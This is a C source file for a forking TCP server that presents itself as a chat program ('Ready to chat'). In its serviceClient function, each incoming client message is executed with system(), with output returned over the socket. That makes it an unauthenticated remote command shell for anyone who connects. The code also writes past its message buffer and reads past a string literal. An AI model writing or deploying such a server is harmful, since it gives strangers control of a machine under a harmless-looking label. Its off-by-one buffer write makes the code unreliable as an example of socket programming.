#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>
#include <sys/wait.h>


void serviceClient(int);

int main(int argc, char *argv[]){  
  int sd, client, portNumber, status;
  struct sockaddr_in servAdd;     
  
 if(argc != 2){
    printf("Call model: %s Port Number\n", argv[0]);
    exit(0);
  }
  if ((sd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
    fprintf(stderr, "Unable to create socket\n");
    exit(1);
  }
  sd = socket(AF_INET, SOCK_STREAM, 0);
  servAdd.sin_family = AF_INET;
  servAdd.sin_addr.s_addr = htonl(INADDR_ANY);
  sscanf(argv[1], "%d", &portNumber);
  servAdd.sin_port = htons((uint16_t)portNumber);
  
  bind(sd, (struct sockaddr *) &servAdd, sizeof(servAdd));
  listen(sd, 5);

  while(1){
    printf("Ready to chat\n");
    printf("Waiting for client\n");
    client = accept(sd, NULL, NULL);
    printf("Connected to client, start chatting\n");
    
    if(!fork())
      serviceClient(client);

    close(client);
    waitpid(0, &status, WNOHANG);
  }
}

void serviceClient(int sd){
	char message[255];
        int n, pid;


        write(sd, "start chatting", 16);

	pid=fork();
	if(pid)                         /* read client's messages */
       while(1){
		   if(n=read(sd, message, 255)){
			 message[n]='\0';
			 //fprintf(stderr,"%s", message);
			 if(!strcasecmp(message, "quit\n")){
			   //	        kill(pid, SIGTERM);
				exit(0);
			 }
			 dup2(sd, STDOUT_FILENO);
			 fprintf(stderr,"%d", system(message));
		   }
	   }
	if(!pid)                      /* send messages to the client  */
	   while(1){
		if(n=read(0, message, 255)){
		  message[n]='\0';
		  write(sd, message, strlen(message)+1);
		  if(!strcasecmp(message, "quit\n")){
		//     kill(getppid(), SIGTERM);
			 exit(0);
			  }
		}
	   }
}